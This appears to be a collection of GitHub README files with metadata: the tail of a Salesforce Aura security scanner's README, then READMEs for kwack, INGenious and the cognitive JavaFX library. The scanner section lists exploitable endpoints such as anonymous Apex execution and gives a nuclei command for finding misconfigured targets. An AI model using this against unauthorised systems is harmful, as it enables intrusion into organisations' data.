- [ ] Download item for *Document* type identifier (hit `https://ATTACHMENTS_DOMAIN/sfc/servlet.shepherd/version/download/<id>` - *URL can also be found in `Generic_DocumentDownloadPathUrl` attribute from descriptor `serviceComponent://ui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableComponentLoaderController/ACTION$getPageComponent`*)  
- [ ] Data API - Composite: `/services/data/vXX.0/composite/batch` (POST, with examples parameters: `{""batchRequests"": [{""method"": ""PATCH"", ""url"": ""v38.0/sobjects/OpportunityLineItem/<ID>"", ""richInput"": {""End_Date__c"": ""2017-01-19""}]}}`)  
- [ ] Data API - Anonymous APEX execution: `/services/data/vXX.0/tooling/executeAnonymous/?anonymousBody=`
- [ ] Async API - Job: `/services/async/xx.0/job` (POST and `<?xml version=""1.0"" encoding=""UTF-8""?><jobInfo xmlns=""http://www.force.com/2009/06/asyncapi/dataload""><operation>update</operation><object>OpportunityLineItem</object><contentType>CSV</contentType></jobInfo>` or `<?xml version=""1.0"" encoding=""UTF-8""?><jobInfo xmlns=""http://www.force.com/2009/06/asyncapi/dataload""><state>Closed</state></jobInfo>`). Other related endpoints: `/services/data/v60.0/jobs/query`, `/services/async/xx.0/job/JOBID`,  `/services/async/xx.0/job/JOBID/batch`, `/services/async/xx.0/job/JOBID/batch/BATCHID/result`
- [ ] Apex REST API: `/services/apexrest/SoapMessage`, `/services/apexrest/Cases`
- [ ] Find the parameters for other classic Aura controllers ğŸ¥¹

## Troubleshooting

> **Disclaimer: ""spaghetti code"" here, due to Salesforce technical contexts discoveries, mixed between official documentations, write-ups, reverse engineering, empirical tests. Hence I could study for small new features proposals or major bug fixes, this tool is now hard to maintain.**

***Then, before opening an issue, please consider the following points:***

1. I strongly encourage you to **switch the logging level** to `DEBUG` or `TRACE` level (`--debug` / `--trace`).
2. The tool can send **thousand of requests** and **works for hours**. Two possible consequences:

- **You can be banned** by the target.
- **The authentication could have a short expiration time on your target**. *I do not know how to detect & manage that part, there is no real homogeneous behaviour for this.* I could only suggest you to reduce the record types to test.

3. I think the tool is adapted to most of Salesforce contexts, **but not all of them**.
4. Route the tool **an HTTP proxy** for further investigation (`--proxy 127.0.0.1:8080` for instance)

## Q/A

*Why is the authentication username/password does not work ?*

> Because the target is maybe not using the Aura Controller `apex://LightningLoginFormController/ACTION$login`: prefer using the `sid` (session id) or `token` (Aura token) after a manual authentication.  

*What's is the difference between `sid` and `token` ?*

> The `token` is used for authenticated Aura controller interactions. The `sid` is used to interact with other APIs (and sometimes Aura controllers). The format are not the same though: for the `token` it is more like a JWT, for the `sid` it is prefixed by the organization identifier.

*Why there are limitations regarding the amount of data dump in queries for example ?*

> Yes, it could be improved with new arguments. The initial reason was that the tool can launch thousand of requests and could last for hours (Entities count / fields cound / controllers count / services count / etc.). The limitations are present to reduce the duration. Feel free to change that.

*How do I find targets ?*

> It is up to you, but it can be done with nuclei: `nuclei -rl 10 -t ""http/misconfiguration/salesforce-aura.yaml"" -l subdomains.txt`

*Why the source code is so complex ? Why Java ?*

> In the beginning it was a clean set of small scripts. Discoveries after discoveries, I have added, modified, removed some parts. Without unit tests. And Salesforce contexts are very complex / customisable, targets behaviors can differ and code is adapted with some unelegant if/then/else. The last reason is that I wanted to have the most adaptable and automatized tool for this kind of assessment. I dig into complex workflows, but abandonned some steps. Why Java ? Because Salesforce APEX is very close to Java, and Salesforce have some libraries in Java which could be decompiled to be dynamically integrated into the tool. And I like Java (nobody is perfect).

## Credits and ressources

Thanks for all these ressources (tools, write-ups, docs, ...), which help me a lot:

- https://www.fishofprey.com/
- https://developer.salesforce.com/
- https://developer.salesforce.com/blogs/tech-pubs/2017/01/simplify-your-api-code-with-new-composite-resources
- https://developer.salesforce.com/docs/atlas.en-us.api_tooling.meta/api_tooling/intro_rest_resources.htm
- https://developer.salesforce.com/docs/atlas.en-us.api_tooling.meta/api_tooling/tooling_api_objects_traceflag.htm
- https://www.varonis.com/blog/abusing-salesforce-communities
- https://github.com/tedconn/lwr-mobify
- https://github.com/Ophion-Security/sret
- https://github.com/forcedotcom/aura
- https://github.com/jeffzmartin/SalesforceSQLSchemaGenerator
- https://github.com/LTiDi2000/SFMisCheck/blob/main/sf.py
- https://github.com/pingidentity/AuraIntruder/
- https://www.youtube.com/watch?v=wHqp6laTnio
- https://web.archive.org/web/20201031233746/https://www.enumerated.de/index/salesforce
- https://codefriar.wordpress.com/2014/10/30/eval-in-apex-secure-dynamic-code-evaluation-on-the-salesforce1-platform/
- https://blog.intigriti.com/hacking-tools/hacking-salesforce-lightning-guide-for-bug-hunters

## Licence

Released under [GPL-3.0 license](/LICENSE).  
",3,0,2,0.0,"['salsa', 'salesforce', 'scanner', 'aura', 'and', 'beyond', 'feature', 'usage', 'help', 'example', 'current', 'limitation', 'todo', 'troubleshoot', 'credit', 'ressources', 'licence']","['salsa', 'salesforce', 'scanner', 'aura', 'and']",1.0,"[maven-assembly-plugin,maven-release-plugin,org.apache.maven.plugins:maven-compiler-plugin]",0.0,1.0,0.0
rayokota/kwack,master,"
# kwack - In-Memory Analytics for Kafka using DuckDB

[![Build Status][github-actions-shield]][github-actions-link]

[github-actions-shield]: https://github.com/rayokota/kwack/actions/workflows/build.yml/badge.svg?branch=master
[github-actions-link]: https://github.com/rayokota/kwack/actions

kwack supports in-memory analytics for Kafka data using DuckDB.

## Getting Started

Note that kwack requires Java 11 or higher. 

To run kwack, download a [release](https://github.com/rayokota/kwack/releases), unpack it.
Then change to the `kwack-${version}` directory and run the following to see the command-line options:

```bash
$ bin/kwack -h

Usage: kwack [-hV] [-t=<topic>]... [-p=<partition>]... [-b=<broker>]...
             [-m=<ms>] [-F=<config-file>] [-o=<offset>] [-k=<topic=serde>]...
             [-v=<topic=serde>]... [-r=<url>] [-q=<query>] [-a=<attr>]...
             [-d=<db>] [-X=<prop=val>]...
In-Memory Analytics for Kafka using DuckDB.
  -t, --topic=<topic>               Topic(s) to consume from and produce to
  -p, --partition=<partition>       Partition(s)
  -b, --bootstrap-server=<broker>   Bootstrap broker(s) (host:[port])
  -m, --metadata-timeout=<ms>       Metadata (et.al.) request timeout
  -F, --file=<config-file>          Read configuration properties from file
  -o, --offset=<offset>             Offset to start consuming from:
                                      beginning | end |
                                      <value>  (absolute offset) |
                                      -<value> (relative offset from end)
                                      @<value> (timestamp in ms to start at)
                                      Default: beginning
  -k, --key-serde=<topic=serde>     (De)serialize keys using <serde>
  -v, --value-serde=<topic=serde>   (De)serialize values using <serde>
                                    Available serdes:
                                      short | int | long | float |
                                      double | string | json | binary |
                                      avro:<schema|@file> |
                                      json:<schema|@file> |
                                      proto:<schema|@file> |
                                      latest (use latest version in SR) |
                                      <id>   (use schema id from SR)
                                      Default for key:   binary
                                      Default for value: latest
                                    The proto/latest/<id> serde formats can
                                    also take a message type name, e.g.
                                      proto:<schema|@file>;msg:<name>
                                    in case multiple message types exist
  -r, --schema-registry-url=<url>   SR (Schema Registry) URL
  -q, --query=<query>               SQL query to execute. If none is specified,
                                      interactive sqlline mode is used
  -a, --row-attribute=<attr>        Row attribute(s) to show:
                                      none
                                      rowkey (record key)
                                      ksi    (key schema id)
                                      vsi    (value schema id)
                                      top    (topic)
                                      par    (partition)
                                      off    (offset)
                                      ts     (timestamp)
                                      tst    (timestamp type)
                                      epo    (leadership epoch)
                                      hdr    (headers)
                                      Default: rowkey,ksi,vsi,par,off,ts,hdr
  -d, --db=<db>                     DuckDB db, appended to 'jdbc:duckdb:'
                                      Default: :memory:
  -x, --skip-bytes=<bytes>          Extra bytes to skip when deserializing with
                                      an external schema
  -X, --property=<prop=val>         Set configuration property.
  -h, --help                        Show this help message and exit.
  -V, --version                     Print version information and exit.
```

kwack shares many command-line options with [kcat](https://github.com/edenhill/kcat) (formerly kafkacat).
In addition, a file containing configuration properties can be used.  The available configuration properties 
are listed [here](https://github.com/rayokota/kwack/blob/master/src/main/java/io/kcache/kwack/KwackConfig.java).

Simply modify `config/kwack.properties` to point to an existing Kafka broker and Schema
Registry. Then run the following:

```bash
# Run with properties file
$ bin/kwack -F config/kwack.properties
```

Starting kwack is as easy as specifying a Kafka broker, topic, and Schema Registry URL:

```bash
$ bin/kwack -b mybroker -t mytopic -r http://schema-registry-url:8081
Welcome to kwack!
Enter ""!help"" for usage hints.

      ___(.)>
~~~~~~\___)~~~~~~

jdbc:duckdb::memory:>
```

When kwack starts, it will enter interactive mode, where you can enter SQL queries 
to analyze Kafka data.  For non-interactive mode, specify a query on the command line:

```bash
$ bin/kwack -b mybroker -t mytopic -r http://schema-registry-url:8081 -q ""SELECT * FROM mytopic""
```

The output of the above command will be in JSON, and so can be piped to other commands like jq.

One can load multiple topics, and then perform a query that joins the resulting tables on a common 
column:

```bash
$ bin/kwack -b mybroker -t mytopic -t mytopic2 -r http://schema-registry-url:8081 -q ""SELECT * FROM mytopic JOIN mytopic2 USING (col1)""
```

One can convert Kafka data into Parquet format by using the COPY commmand in DuckDB:

```bash
$ bin/kwack -b mybroker -t mytopic -r http://schema-registry-url:8081 -q ""COPY mytopic to 'mytopic.parquet' (FORMAT 'parquet')""
```

If not using Confluent Schema Registry, one can pass an external schema:

```bash
$ bin/kwack -b mybroker -t mytopic -v mytopic=proto:@/path/to/myschema.proto
```

For a given schema, kwack will create DuckDB columns based on
the appropriate Avro, Protobuf, or JSON Schema as follows:

|Avro | Protobuf | JSON Schema | DuckDB |
|-----|----------|-------------|--------|
|boolean | boolean | boolean | BOOLEAN |
|int | int32, sint32, sfixed32 || INTEGER |
|| uint32, fixed32 || UINTEGER |
|long | int64. sint64, sfixed64 | integer | BIGINT |
|| uint64, fixed64 || UBIGINT |
|float | float || FLOAT |
|double | double | number | DOUBLE |
|string | string | string | VARCHAR |
|bytes, fixed | bytes || BLOB |
|enum | enum| enum | ENUM |
|record | message | object | STRUCT |
|array | repeated | array | LIST |
|map | map || MAP |
|union | oneof | oneOf,anyOf | UNION |
|decimal | confluent.type.Decimal || DECIMAL |
|date | google.type.Date || DATE |
|time-millis, time-micros | google.type.TimeOfDay || TIME |
|timestamp-millis ||| TIMESTAMP_MS |
|timestamp-micros ||| TIMESTAMP |
|timestamp-nanos | google.protobuf.Timestamp || TIMESTAMP_NS |
|duration | google.protobuf.Duration || INTERVAL |
|uuid ||| UUID |

For more on how to use kwack, see this [blog](https://yokota.blog/2024/07/11/in-memory-analytics-for-kafka-using-duckdb/).
",11,7,10,3.0,"['kwack', 'analytics', 'kafka', 'use', 'duckdb', 'get', 'start', 'run', 'property', 'file']","['kwack', 'analytics', 'kafka', 'use', 'duckdb']",1.0,"[com.github.os72:protoc-jar-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0
ing-bank/INGenious,main,"# INGenious Playwright Studio - Test Automation for Everyone

[![Build INGenious Source Code](https://github.com/ing-bank/INGenious/actions/workflows/maven.yml/badge.svg)](https://github.com/ing-bank/INGenious/actions/workflows/maven.yml)
![Static Badge](https://img.shields.io/badge/Version-1.0-%23FF6200)

--------------------------------------------------------------------

<span style=""color:#FF6200;width:100px"">**INGenious**</span> enables easy and effective test automation for **everyone.**



Developed and perfected by <span style=""color:#FF6200;width:100px"">**ING Bank**</span> for over 4 years of real-world usage, **INGenious** is now open-source and available to everyone. Designed to simplify and streamline test automation, this robust solution empowers teams of all sizes to achieve efficient, high-quality testing. By joining the global testing community, ING aims to collaborate, innovate, and elevate automated testing together.

> [!NOTE]
> It provides an easy and simple way to create highly reliable automated tests. It leverages the power of __Playwright-Java__ and combines it with a user-friendly IDE which makes it a highly effective solution. 
> The idea behind INGenious is to enable engineers, business analysts and even non-technical stakeholders to design high quality automated tests which focus on the business goals, without them having to worry about coding.


:atom: **The complete documentation is available here :** https://ing-bank.github.io/ingenious-doc/

## At a Glance


-   :white_check_mark: __Get Started in 5 minutes__

    Download <span style=""color:#FF6200"">INGenious</span> and get up and running in minutes. Create and execute your test cases in no time.

    [:arrow_right: Getting started](https://ing-bank.github.io/ingenious-doc/gettingstarted/)

-   :white_check_mark: __No Code/Low Code__

    <span style=""color:#FF6200"">INGenious</span> comes with an intuitive IDE which makes test designing simple, easy and fun.

    [:arrow_right: IDE](https://ing-bank.github.io/ingenious-doc/knowyourframework/)

-   :white_check_mark: __Browser Automation__

    <span style=""color:#FF6200"">INGenious</span> leverages the power of **Playwright** to create robust and stable browser tests.

    [:arrow_right: Browser Testing](https://ing-bank.github.io/ingenious-doc/browsertesting/)

-   :white_check_mark: __API Automation__

    <span style=""color:#FF6200"">INGenious</span> leverages **Java HTTP Client** to create API tests.

    [:arrow_right: API Testing](https://ing-bank.github.io/ingenious-doc/api/)



-   :white_check_mark: __Full customization__

    <span style=""color:#FF6200"">INGenious</span> comes with a full blown `maven` project which can be easily customized based on project needs.

    [:arrow_right: Customizations](https://ing-bank.github.io/ingenious-doc/customizations/)

-   :white_check_mark: __Integrated BDD__

    <span style=""color:#FF6200"">INGenious</span> supports BDD way of working and comes with a built-in feature file editor.

    [:arrow_right: BDD Support](https://ing-bank.github.io/ingenious-doc/bdd/)

-   :white_check_mark: __Seamless Azure Test Plan Integration__

    Test Case and Defect Management via Azure DevOps Test Plan can be done with <span style=""color:#FF6200"">INGenious</span> very easily

    [:arrow_right: Test Plan](https://ing-bank.github.io/ingenious-doc/testplan/)

-   :white_check_mark: __Seamless integration with any CI tool__

    <span style=""color:#FF6200"">INGenious</span> is built in Java and has a strong command line interface. This makes integration with any CI tool, very easy.

    [:arrow_right: Integration](https://ing-bank.github.io/ingenious-doc/ci/)

-   :white_check_mark: __Open Source, MIT__

    <span style=""color:#FF6200"">INGenious</span> is licensed under MIT and available on **GitHub**

    [:arrow_right: License](https://github.com/ing-bank/INGenious)







--------

## Features coming soon

INGenious will also cater to the following types of testing. Currently, these are in the beta-testing stage in ING.



:iphone: __Mobile App__ testing

:open_file_folder: __Database__ testing




--------


",1,11,2,9.0,"['ingenious', 'playwright', 'studio', 'test', 'automation', 'everyone', 'at', 'glance', 'feature', 'come', 'soon']","['ingenious', 'playwright', 'studio', 'test', 'automation']",9.0,"[com.google.code.maven-replacer-plugin:replacer,maven-assembly-plugin,maven-clean-plugin,maven-compiler-plugin,maven-resources-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-eclipse-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin]",0.0,7.0,2.0
carldea/cognitive,main,"ğŸš§ Work in progress ğŸš§
Please view the Wiki [here](https://github.com/carldea/cognitive/wiki)
# What's new? [Release notes](https://github.com/carldea/cognitive/releases)
- [1.3.0](https://github.com/carldea/cognitive/releases/tag/release%2F1.3.0) 09/04/2024 - Enums for property name lookups. Added SLF4J, JUnit5, began unit tests.
- [1.2.0](https://github.com/carldea/cognitive/releases/tag/release%2F1.2.0) 08/05/2024 - Validators support multiple validation messages.
- [1.1.0](https://github.com/carldea/cognitive/releases/tag/release%2F1.1.0) 06/28/2024 - `PropertyIdentifier` type objects to reference properties.
- [1.0.0](https://github.com/carldea/cognitive/releases/tag/release%2F1.0.0) 05/30/2024 - Initial Release. `FXMLMvvmLoader`, `SimpleViewModel`, `ValidationViewModel`, `Validator`(s).

# Cognitive
A lightweight JavaFX (21+) forms framework based on the MVVM UI architecture pattern.

View Models maintain the state of a view (Form) and, in principle, should contain a controller's presentation logic.
This
MVVM allows the developer to test the presentation logic without having to wire up a JavaFX controller during runtime.

## Quick Start
To use Cognitive in your project, download and install Java 21 JDK. The library depends on JavaFX 21+
To see the demo's code see [Form demo](https://github.com/carldea/cognitive/tree/main/src/test/java/org/carlfx/cognitive/test/demo)

*Gradle:*
```gradle
implementation 'org.carlfx:cognitive:1.3.0'
```

*Maven:*
```xml
<dependency>
    <groupId>org.carlfx</groupId>
    <artifactId>cognitive</artifactId>
    <version>1.3.0</version>
</dependency>
```

Project using Java Modules (JPMS) will want to do the following in the consuming module:
```java

requires org.carlfx.cognitive;

// open for FXML loaders
opens com.mycompany.myproject.controller to javafx.fxml, org.carlfx.cognitive;

```
As you can see, the opens allow FXML and Controller code to inject view models and UI controls using reflection.

# Introduction
Software developers creating form based applications will inevitably stumble across the single most important UI architectural design pattern [Model View Controller](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller) or **MVC** in short. This concept has paved the way for many frameworks which provide a good (acceptable) [separation of concerns.](http://en.wikipedia.org/wiki/Separation_of_concerns)

However, there are drawbacks to the MVC pattern (especially in JavaFX). One main drawback is that the controller layer can be difficult (if not impossible) to test. It is especially concerning when you are JavaFX developer who has worked with FXML and controller classes.

The pattern will avoid coupling the UI components, model (data) and presentation logic within a controller class. Because UI components are available during runtime it difficult to test interactions (presentation logic) between the model layer and UI.

**So, what is a solution?**

You guessed it! The **MVVM** UI architecture pattern.

## What is MVVM?

MVVM is an architectural pattern that isolates the business logic/back-end data(Presentation Logic) from the view (UI code). Its goal is to simplify user interface development. According to Wikipedia, the [MVVM](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93viewmodel) is a variation of [Martin Fowler](https://en.wikipedia.org/wiki/Martin_Fowler_(software_engineer))'s perspective of the [Presentation Model design pattern](https://martinfowler.com/eaDev/PresentationModel.html).

Next, let's see how to apply the MVVM UI pattern to an existing JavaFX Application

# Converting JavaFX MVC to the MVVM UI pattern

Before I show you how to convert a JavaFX MVC structure, let's compare the differences between MVC and the MVVM UI architecture patterns.

## MVC (Model View Controller)
Typically MVC is used in Java Swing or JavaFX UI form type apps.

JavaFX is MVC-based, where developers often follow the [Supervising Controller Pattern](https://martinfowler.com/eaaDev/SupervisingPresenter.html). An excerpt describing the controller's ability to manipulate the view with more complex view logic:

> ""Supervising Controller uses a controller both to handle input response but also to manipulate the view to handle more complex view logic. It leaves simple view behavior to the declarative system, intervening only when effects are needed that are beyond what can be achieved declaratively.""

In the case of JavaFX, the declarative part would be FXML & CSS (XML representing the View).

JavaFX can also bind ([Properties API](https://dev.java/learn/javafx/properties/)) UI controls and listeners to synchronize the model data. While it is convenient to do this inside a controller(Presenter) class, the code is tightly coupled regarding presentation logic, (complex) view logic, and (possibly) business logic, making code difficult to maintain, debug, and test.

It is difficult to test especially when many UI controls are realized (dependency injected) during runtime, such as `@FXML` annotated UI controls inside controller classes.

![mvc-ui-pattern](https://github.com/carldea/cognitive/assets/1594624/b8d811a2-cab6-4ac4-aa0e-5778a03e0d0b)

Now, let's look at the MVVM pattern and how it differs.

## MVVM (Model View ViewModel)
The MVVM UI pattern is a variation of the [Presentation Model Pattern](https://martinfowler.com/eaaDev/PresentationModel.html). Both MVVM and Presentation Model pattern both achieve the separation of the **View** and the **Model**. An excerpt from Martin Fowler's section on **When to use it?**
> ""Presentation Model allows you to write logic completely independent of the views used for display. You also do not need to rely on the view to store state.""

What's important is that the `ViewModel` manages the state. Later, we'll look at how to bind data between the View and ViewModel to synchronize model data.

The following is how MVVM is normally depected:

![mvvm-ui-pattern](https://github.com/carldea/cognitive/assets/1594624/6e290bc4-2b5e-475f-991f-291b196e207f)

As you will notice, the **model** does not update the view layer, which he main difference between MVVM and MVC.

The main advantage is testing **presentation logic** separately from the UI form and its associated JavaFX Controller class.

Now that you've seen the pros and cons between MVC and MVVM how do we conceptually convert a JavaFX MVC UI form into the MVVM pattern?

**Hint:**  Refactor (pull out) presentation logic and business logic away from JavaFX controllers into ViewModels or Model (services).

## Converting a JavaFX MVC Form UI using the MVVM pattern
Below is a conceptual way to think of JavaFX using the MVVM UI pattern.

Cognitive is an un-opinionated library that let's you to refactor things at your own pace. As you get comfortable, you'll notice that JavaFX controller classes contain less code where presentation logic is move off to the ViewModels.

![javafx-mvvm-ui-pattern](https://github.com/carldea/cognitive/assets/1594624/aa922411-e4fb-456a-93bc-6f8c7a333ad7)


As shown above, you can treat the JavaFX FXML & Controller class as the **View**, and the Model will remain the same. The only difference is that the ViewModels will contain much of the state of the UI form and presentation logic. The objective is to make the view very stupid.

Now that you know conceptually, let's look at a code example of an MVC-style controller with a save operation.

### This is a typical controller without the use of a view model.
Below is an example of how a UI form is about to save data.
```java
/**
 * User clicks on save button to save contact information.
 * @param ae event 
 */
@FXML
private void saveAction(ActionEvent ae) {
   // copy user's input
   String firstName = firstNameTextField.getText();
   String lastName = lastNameTextField.getText();
   
   // validate user's input
   // if valid write to database and reset ui.
   // db.write(new Person(firstName, lastName));

}
```
Now, let's look at how to use a view model in a controller class.

### Using ValidationViewModels in a controller
Using view models, you can have presentation logic or business logic. When testing presentation logic, you can populate a view model with the correct values without modifying the UI. Remember, a view model does not contain any UI controls. Shown below is an example of using a view model.

```java

@FXML
private void initialize() {
   firstNameTextField.textProperty().bidirectionalBind(personViewModel.getProperty(FIRST_NAME));
   lastNameTextField.textProperty().bidirectionalBind(personViewModel.getProperty(LAST_NAME));
}

@FXML
private void saveAction(ActionEvent ae) {
    personViewModel.save(); // validates
    if (personViewModel.hasErrorMsgs()) {
       // apply messages to badges or decorate control for fields or global messages.  
    } else {
       // view model get model values and has logic to persist data.
       String firstName = personViewModel.getValue(FIRST_NAME);
       String lastName = personViewModel.getValue(LAST_NAME);
       // personViewModel.writePerson(new Person(firstName, lastName)); 
    }
}
```
Above you can see there are 4 steps to using View Models:

1. **Binding** - Bind JavaFX controls and their properties to the view model's properties (property value layer).
2. **Validation** - Upon `saveAction()` method perform a view model's `save()` method (which calls the `validate()` method)
3. **Error Messages** - Check if there are any error messages if so, these can be applied to controls for user feedback.
4. **Model Values** - Once you have **valid** values (model value layer) the code calls to view model's `.getValue()` method to return raw values.
   NOTE: Think of a view model with **two layers** a **Property Values** and **Model Values**. ValidationViewModel`'s save
   Now that you see, much of the work uses view models instead of methods or UI code inside the controller class. The developer aims to remove state and presentation logic from the controller class.

Let's look at the two main implementations of the ViewModel interface SimpleViewModel and ValidationViewModel.

## `SimpleViewModel`
Let's start by creating a `SimpleViewModel` with one property with a String such as a first name. The objective is
To create a JavaFX text field and bind the value with a view model's property.

To bind properties do the following:
```java
final String FIRST_NAME = ""firstName"";

// A text field
var firstNameTextField = new TextField();

// Create a 
var personVm = new SimpleViewModel()
        .addProperty(FIRST_NAME, """");

// Bidirectional bind of the first name property and text field's text property.
firstNameTextField.textProperty().bidirectional(personVm.getProperty(FIRST_NAME));

// Set view model property value.
personVm.setPropertyValue(FIRST_NAME, ""Fred"");

// Output Text field's text property
System.out.println(""First name = "" + firstNameTextField.getText());
```

Output:

```text
First name = Fred
```
As you can see whenever a user enters text into the text field (`TextField`) the view model's property (first name) gets populated and visa-versa.

Usually if you have a UI Form that has read-only or no validation needed a `SimpleViewModel` can be used. A form controls bound to properties on a view model you can call the `reset()` method to copy initial model values back into the property values, thus clearing the screen. The `save()` method
will copy the property values into the model values layer. For simple UIs you can validate fields manually.

## `ValidationViewModel`

Next, let's look at ValidationViewModel(s). These allow the developer to add validation to properties. The following example
shows you how to create properties and add validators. These use cases are typically when a user is about to save information. Here they would need to validate before obtaining model values. New in version 1.3.0 are **Enums** as property names!

```java
public enum PersonField {
    FIRST_NAME(""First Name""),
    LAST_NAME(""Last Name""),
    AGE(""Age""),
    PHONE(""Phone""),
    HEIGHT(""Height""),
    COLORS(""Colors""),
    FOODS(""Foods""),
    THING(""thing""),
    MPG(""Mpg""),
    CUSTOM_PROP(""Custom Prop"");

    public final String name;
    PersonField(String name){
        this.name = name;
    }
}

var personVm = new ValidationViewModel()
        .addProperty(FIRST_NAME, """")
        .addValidator(FIRST_NAME, FIRST_NAME.name(), (ReadOnlyStringProperty prop, ViewModel vm) -> {
            if (prop.isEmpty().get()) {
                return new ValidationMessage(FIRST_NAME, MessageType.ERROR, ""${%s} is required"".formatted(FIRST_NAME));
            }
            return VALID;
        })
        // Adding multiple validation messages
        .addValidator(FIRST_NAME, FIRST_NAME.name(), (ReadOnlyStringProperty prop, ValidationResult validationResult, ViewModel viewModel) -> {
            if (prop.isEmpty().get() || prop.isNotEmpty().get() && prop.get().length() < 3) {
                validationResult.error(""${%s} must be greater than 3 characters."".formatted(FIRST_NAME));
            }
            String firstChar = String.valueOf(prop.get().charAt(0));
            if (firstChar.equals(firstChar.toLowerCase())) {
                validationResult.error(""${%s} first character must be upper case."".formatted(FIRST_NAME));
            }
        })
        .addProperty(PHONE, ""111-1111111"")
        .addValidator(PHONE, PHONE.name(), (ReadOnlyStringProperty prop, ValidationResult validationResult, ViewModel vm) -> {
            String ph = prop.get();
            Pattern pattern = Pattern.compile(""([0-9]{3}\\-[0-9]{3}\\-[0-9]{4})"");
            Matcher matcher = pattern.matcher(ph);
            if (!matcher.matches()) {
                validationResult.error(""${%s} must be formatted XXX-XXX-XXXX. Entered as %s"".formatted(PHONE, ph);
            }
        });

// validate view model
personVm.validate();

if (personVm.hasErrors()) {
        for (ValidationMessage vMsg : personVm.getValidationMessages()) {
        System.out.println(""msg Type: %s errorcode: %s, msg: %s"".formatted(vMsg.messageType(), vMsg.errorCode(), vMsg.interpolate(personVm)) );
        }
        }

```
Output:

```text
msg Type: ERROR errorcode: -1, msg: First Name is required
msg Type: ERROR errorcode: -1, msg: First Name must be greater than 3 characters.
msg Type: ERROR errorcode: -1, msg: Phone Number must be formatted XXX-XXX-XXXX. Entered as 111-1111111

```
Above you'll notice the first name field is required and must be more than 3 characters. The phone number is formatted incorrectly.

As each validation message contains a property of the field in question the code can create decorators or badges affixed on a UI control to allow the user to see the error or warning.
```java
ValidationMessage vMsg = ...;
Label firstNameError = ...;
        if (FIRST_NAME.equals(vMsg.propertyName())) {
        firstNameError.setText(vMsg.message());
        }

```
Now let's fix the validation issues but instead of calling `validate()` you should call `save()`. A `ValidatationViewModel` overrides the `SimpleViewModel`'s `save()` method.

The `save()` method essentially copies property values into the model value layer. Since a call to the `validate()` method happens before the `save()` method, property values will not be copied when errors occur.

```java
personVm.setPropertyValue(FIRST_NAME, ""Fred"");
personVm.setPropertyValue(PHONE, ""123-867-5309"");
personVm.save();

```

The correct thing to do is obtain the view model's model values by calling the following:

```java
if (personVm.hasErrorMsgs()) {
        return;
        }
// Valid!
// Obtain valid values from the view model.
String validFirstName = personVm.getValue(FIRST_NAME); // You should not use personVm.getPropertyValue(FIRST_NAME);

// Write to database 
db.write(...);

```
You can think of the property values of a view model used for the form ui and the model values used on the backend.

## How to inject view models into JavaFX controllers?

When creating JavaFX controller classes you can add view models by using the annotation as follows:

```java
// ... A controllers instance variables

@InjectViewModel
SimpleViewModel personViewModel;

```
When you've created a FXML (view) and a controller you must use the `FXMLMvvmLoader.make()` facility.

```java
Config config = ...;
JFXNode<Pane, PersonController> personJFXNode = FXMLMvvmLoader.make(config);
Pane personPane = personJFXNode.node();
PersonController personController = personJFXNode.controller();
// perform work

```
## Demo - Account Creation Form

Here's a demo UI form without values. As a user types into fields, the **validator** for populating the form will update the submit button state. If any fields are not populated, the save button will be disabled.

When pressing the submit button the validation behavior occurs afterwards. To see the demo's code see [Form demo](https://github.com/carldea/cognitive/tree/main/src/test/java/org/carlfx/cognitive/test/demo)

![demo1](https://github.com/carldea/cognitive/assets/1594624/320c19f2-6545-4f43-8762-522ec0100b93)

Input in error (after save to validate)

<img width=""432"" alt=""demo2"" src=""https://github.com/carldea/cognitive/assets/1594624/069d2af3-fd24-469b-88a2-2cc28d08d2ac"">

When the submit is pressed show the overlay icons for each field with an error.

<img width=""595"" alt=""demo3"" src=""https://github.com/carldea/cognitive/assets/1594624/ced72d75-6681-4d42-a5c8-974ea70cab6f"">

As you can see the user entered an initial character as an upper case 'F' only one error message alerts user that it must be 3 characters or more. With the new support of multiple error messages when using validator let show multiple messages related to the first name field.

Here are the following requirements or validation rules for First Name:
* Must not be blank
* Must be greater than 3 characters
* First character must be upper case

Let's enter one lowercase character into the First Name field and click on submit to evaluate error messages.
Shown below is the new support for multiple validation messages using ConsumerValidators.

<img width=""594"" alt=""Screenshot 2024-08-05 at 2 37 32â€¯PM"" src=""https://github.com/user-attachments/assets/63478b27-2d7c-4017-862d-fea2bef45b32"">

Above you will notice the first name field the user entered one lowercase 'f' character getting 2 validation messages.
To see how to add multiple validation messages shown below is a `StringConsumerValidator` for the first name field.

```java
viewModel.addValidator(FIRST_NAME, ""First Name"", (ReadOnlyStringProperty prop, ValidationResult validationResult, ViewModel viewModel) -> {
        if (prop.isEmpty().get() || prop.isNotEmpty().get() && prop.get().length() < 3) {
        validationResult.error(FIRST_NAME, ""${%s} must be greater than 3 characters."".formatted(FIRST_NAME));
        }
String firstChar = String.valueOf(prop.get().charAt(0));
    if (firstChar.equals(firstChar.toLowerCase())) {
        validationResult.error(FIRST_NAME, ""${%s} first character must be upper case."".formatted(FIRST_NAME));
        }
        });
```

Now let's add correct data with valid input.

<img width=""488"" alt=""demo4"" src=""https://github.com/carldea/cognitive/assets/1594624/66c147a1-abc6-4ca7-b018-a4b6ba8b545c"">

# References
The following are links on the topic of UI/UX and Patterns:
* [GUI Architectural Patterns by Martin Fowler](https://martinfowler.com/eaaDev/uiArchs.html) - Model View Controller, Model-View-Presenter
* [Flow Synchronization Pattern](https://martinfowler.com/eaaDev/FlowSynchronization.html) - How to synch data between UI form and domain objects.
* [Separated Presentation](https://martinfowler.com/eaaDev/SeparatedPresentation.html) - Separating presentation and business logic code in separate layers.
